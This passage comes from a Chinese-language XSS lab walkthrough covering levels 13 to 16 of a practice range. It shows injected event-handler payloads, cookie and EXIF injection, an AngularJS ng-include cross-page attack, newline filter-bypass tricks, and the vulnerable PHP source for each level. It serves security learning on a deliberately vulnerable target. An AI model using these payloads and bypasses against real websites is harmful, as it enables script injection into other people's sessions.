type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>; </span><br><span class="line"><span class="comment">//转义后再拼接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>类型：隐藏标签</p>
<p>解题思路：</p>
<p>探测：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_cook=5</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_48.png" class="" title="在这里插入图片描述">
<p>测试t_sort</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_49.png" class="" title="在这里插入图片描述">

<ul>
<li>双引号被实例化转义</li>
</ul>
<p>其余测试payload也失败</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="*Cookie"></a>*Cookie</h3><p>抓取数据包修改cookie栏：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<p>点击文本框成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];  <span class="comment">//获取cookie</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level14a"><a href="#level14a" class="headerlink" title="level14a"></a>level14a</h2><p>类型：</p>
<p>解题思路;</p>
<h3 id="PHP解析执行机制"><a href="#PHP解析执行机制" class="headerlink" title="*PHP解析执行机制"></a>*PHP解析执行机制</h3><blockquote>
<p>PHP 解析机制：PHP 文件本质上是服务器端脚本文件，当服务器接收到对 PHP 文件的请求时，会先对其中的 PHP 代码进行解析和执行。 如果文件里有 HTML、CSS、JavaScript 代码，PHP 解析器会直接将这些非 PHP 代码原样输出给客户端。</p>
</blockquote>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);&lt;/scritp&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_50.png" class="" title="在这里插入图片描述">
<p>script 别td 包含，无法执行js代码</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>      //页面加载触发</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>  //数标悬停触发</span><br></pre></td></tr></table></figure>
<p>渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_51.png" class="" title="在这里插入图片描述">


<p>通关成功</p>
<p>源码分析：</p>
<hr>
<h2 id="level14b"><a href="#level14b" class="headerlink" title="level14b"></a>level14b</h2><p>类型：文件上传</p>
<p>解题思路：</p>
<h3 id="EXIF"><a href="#EXIF" class="headerlink" title="*EXIF"></a>*EXIF</h3><blockquote>
<p>图片的 EXIF（Exchangeable Image File Format） 是嵌入在图片文件中的一组元数据（Metadata），记录了拍摄设备、拍摄参数、时间、地理位置等信息。它是数码照片的“数字身份证”，广泛应用于摄影、取证和图片管理<br>EXIF 包含的信息：</p>
<blockquote>
<p>1.基础信息:</p>
<blockquote>
<p>拍摄时间、日期<br>文件格式（如 JPEG、RAW）<br>文件大小和分辨率</p>
<blockquote>
<p>2.设备参数</p>
<blockquote>
<p>相机品牌和型号（如 Canon EOS 5D Mark IV）<br>镜头型号<br>序列号（部分设备）</p>
<blockquote>
<p>3.拍摄参数</p>
<blockquote>
<p>光圈值（F值）<br>快门速度<br>ISO 感光度<br>焦距（如 50mm）<br>白平衡模式<br>曝光补偿</p>
<blockquote>
<p>4.地理位置</p>
<blockquote>
<p>GPS 坐标（需设备开启定位功能）<br>海拔高度（部分设备支持）</p>
<blockquote>
<p>4.其他信息</p>
<blockquote>
<p>版权声明（作者信息）<br>缩略图预览<br>后期编辑软件（如 Photoshop 修改记录）</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<p>EXIF 的作用与用途<br>1.摄影学习<br>2.分析他人作品的拍摄参数（如光圈、快门），提升摄影技巧。<br>3.图片管理<br>4.按时间、设备分类整理照片。<br>5.版权保护<br>6.通过 EXIF 中的作者信息证明图片归属。<br>地理位置记录<br>7.旅行摄影时标记拍摄地点。<br>8.取证调查<br>9.验证图片真实性（如时间、设备是否匹配）。</p>
</blockquote>
<blockquote>
<p>问题与解决：<br>1.敏感信息泄露<br>GPS 坐标可能暴露家庭住址或常去地点。<br>2.清除 EXIF</p>
<blockquote>
<p>分享图片前，使用工具删除 EXIF（如 Exif Purge）。</p>
</blockquote>
<p>3.平台自动删除</p>
<blockquote>
<p>微信、微博等社交平台上传图片时会默认清除 EXIF。</p>
</blockquote>
</blockquote>
<p>随便上传正常的照片：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_52.png" class="" title="在这里插入图片描述">
<p>展示了很多项信息，随便修改图片的某一项为xss攻击代码即可通关</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_53.png" class="" title="在这里插入图片描述">
<p>有自动弹窗</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>解题思路：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_54.png" class="" title="在这里插入图片描述">
<blockquote>
<p>页面技术特征<br>1.AngularJS 框架：代码引入了 angular.min.js，说明页面依赖 AngularJS 动态渲染内容。<br>2.未实现的 ngInclude：注释 <!-- ngInclude: undefined --> 表明存在一个未完成的动态内容加载逻辑，可能需通过特定操作触发</p>
</blockquote>
<h3 id="AngularJS与指令ng-inlcude"><a href="#AngularJS与指令ng-inlcude" class="headerlink" title="*AngularJS与指令ng-inlcude"></a>*AngularJS与指令ng-inlcude</h3><blockquote>
<ol>
<li>ng - include指令特性<blockquote>
<p>ng - include是 Angular JS 框架中的指令，用于在 HTML 页面中动态包含外部文件或片段，通过浏览器的 XHR 请求加载外部文件（需确保文件在同一域名下可访问）。它与服务器端的文件包含（如 PHP）不同，是在浏览器端请求并加载文件内容，然后将其插入到当前页面指定位置。</p>
</blockquote>
</li>
</ol>
</blockquote>
<p>攻击原理：</p>
<blockquote>
<p>默认情况下的，ng-include 只能加载当前页面同源的（相同域名，协议，端口）的文件<br>ng - include加载level1.php时，将name&#x3D;[script]alert(&#x2F;xss&#x2F;)[&#x2F;script]作为参数传递给level1.php。<br>由于level1.php未对name参数做严格过滤，浏览器解析level1.php返回的 HTML 时，会执行恶意脚本alert(&#x2F;xss&#x2F;)，从而触发 XSS 攻击。</p>
</blockquote>
<p>关卡：</p>
<blockquote>
<p>本关漏洞利用分析<br>1.当前关卡过滤：</p>
<blockquote>
<p>传入的src参数会被htmlspecialchars()函数过滤，直接注入script等敏感标签会被转义，无法直接触发 XSS。</p>
</blockquote>
<p>2.结合其他页面漏洞：</p>
<blockquote>
<p>靶场中其他页面（如level1.php）存在 XSS 漏洞（假设name参数输入未过滤）</p>
</blockquote>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用ng - include的文件包含特性，构造 Payload：</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;        	//不行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(&quot;123&quot;)&#x27;</span>&gt;</span>&#x27;	   //不行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&#x27;  	  //不行</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&quot;       //不行</span><br><span class="line"></span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;    //行</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;     //行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&#x27;    //行</span><br><span class="line"></span><br><span class="line"> - 用img标签行</span><br><span class="line"> - onerror外不套单双引号，让浏览器容错，防止过多的单双引号让浏览器识别错误</span><br><span class="line"></span><br><span class="line">为什么有些语句为什么不行呢？</span><br><span class="line">因为语句要考虑的不仅仅是本关的过滤，也要考虑引用对应关卡的过滤</span><br></pre></td></tr></table></figure>

<p>关键流程总结</p>
<blockquote>
<p>ng - include通过浏览器请求加载level1.php，传递带有恶意脚本的参数。<br>存在漏洞的level1.php接收参数后，未过滤直接回显恶意脚本到页面。<br>浏览器解析执行恶意脚本，完成 XSS 攻击。</p>
</blockquote>
<p>这种利用方式绕过了当前关卡的过滤，借助ng - include的特性和其他页面的 XSS 漏洞，实现了跨页面的脚本攻击。</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];   <span class="comment">//获取src的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;  <span class="comment">//实例化转义--&gt;因此本关的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>解题思路：</p>
<p>类型：输入框类型</p>
<p>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>网页回显情况：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_55.png" class="" title="在这里插入图片描述">
<p>查看实例化情况：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_56.png" class="" title="在这里插入图片描述">

<p>此时的页面渲染:</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_57.png" class="" title="在这里插入图片描述">


<p>补充知识：center标签</p>
<blockquote>
<p>[center]标签的作用：将包裹的文本、图片或其他元素在父容器中水平居中显示。<br>HTML4 及更早版本支持 center，但 HTML5 已将其废弃。<br>被弃用的原因：<br>1.HTML 应专注于结构（如标题、段落），样式应交给 CSS 控制。<br>2.维护性和灵活性差：混合样式与结构，导致代码难以维护。<br>3.无法适应复杂布局（如响应式设计）。<br>重点：center 标签内嵌套 script 标签，其中的 JavaScript 代码仍会被浏览器执行</p>
</blockquote>
<p>解读回显信息：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span> -&gt;   &lt;</span><br><span class="line"><span class="symbol">&amp;gt;</span> -&gt;   &gt;</span><br><span class="line"><span class="symbol">&amp;nbsp;</span> -&gt; 空格</span><br><span class="line"><span class="symbol">&amp;amp;</span> -&gt; &amp;</span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span>alert(&quot;123&quot;);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span> 即为：</span><br><span class="line">&lt; &gt;alert(&quot;123&quot;);&lt;  &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>括号内的双引号没有实例化转义或被替换</li>
<li>特殊符号 &lt; &gt;  空格  &amp; 号被实例化转义</li>
<li>script标签缺失，准确来说被替换为空格</li>
</ul>
<p>换标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span> </span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_58.png" class="" title="在这里插入图片描述">
<h3 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="*换行符绕过"></a>*换行符绕过</h3><p>在 XSS 攻击中，<strong>换行符绕过过滤</strong>的核心原理是利用浏览器与过滤规则对换行符（<code>\n</code> 或 <code>%0A</code>）的解析差异，使得恶意代码能够绕过安全检测，同时被浏览器正常执行。以下是详细解释和应用场景：</p>
<p>绕过原理：</p>
<ol>
<li><p><strong>浏览器与过滤规则对换行符的解析差异</strong>  </p>
<ul>
<li><strong>浏览器</strong>：在 HTML 中，标签属性之间的换行符通常会被视为<strong>普通空格</strong>，甚至在某些情况下被直接忽略。  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag">   <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- 等同于 &lt;img src=x onerror=alert(1)&gt; --&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>过滤规则</strong>：可能未正确处理换行符，例如：  <ul>
<li>仅检测连续的关键字（如 <code>onerror</code>），但换行符将关键字拆分为 <code>on\nerror</code> 时，绕过黑名单。  </li>
<li>过滤空格但未过滤换行符，导致换行符成为替代分隔符。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>混淆代码结构</strong><br>通过换行符改变代码的视觉结构，使静态正则表达式或简单字符串匹配失效。例如：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- %0A 是 URL 编码的换行符 --&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用场景：</p>
</li>
<li><p><strong>绕过空格过滤</strong></p>
</li>
</ol>
<ul>
<li><strong>场景</strong>：目标过滤了空格（如删除或转义为 <code>&amp;nbsp;</code>），但允许换行符。  </li>
<li><strong>利用方式</strong>：用换行符（<code>%0A</code>）替代空格分隔标签属性。  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器解析为 <code>&lt;img src=x onerror=alert(1)&gt;</code>。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><strong>分割关键字</strong></p>
<ul>
<li><strong>场景</strong>：目标使用黑名单检测连续的关键字（如 <code>onerror</code>）。  </li>
<li><strong>利用方式</strong>：插入换行符拆分关键字，使其无法被正则表达式匹配。  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器会将换行后的内容合并为 <code>onerror</code>，但过滤规则可能因换行符失效。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>绕过属性值闭合检测</strong></p>
<ul>
<li><strong>场景</strong>：目标检查属性值的闭合（如 <code>&quot;</code> 或 <code>&#39;</code>），但未处理换行符。  </li>
<li><strong>利用方式</strong>：在属性中插入换行符，构造未闭合的上下文：  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascri%0Apt:alert(1)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器可能忽略换行符，解析为 <code>javascript:alert(1)</code>。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>实际绕过示例：</p>
<p>示例 1：绕过空格过滤<br>假设目标过滤空格，但允许换行符：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>浏览器解析</strong>：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>  </li>
<li><strong>绕过效果</strong>：成功触发 <code>onerror</code> 事件。</li>
</ul>
<p>示例 2：分割敏感关键字<br>假设目标过滤 <code>onerror</code> 关键词：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">即 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>浏览器解析</strong>：<code>onerror</code> 被合并，触发事件。  </li>
<li><strong>过滤规则</strong>：可能因换行符无法检测到 <code>onerror</code>。</li>
</ul>
<hr>
<p>由于script会被过滤，所以不使用<br>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Asrc=x%0Aonerror=alert(&#x27;123&#x27;)&gt;    不用双引号，因为被实例化转义</span><br></pre></td></tr></table></figure>

<p>成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span 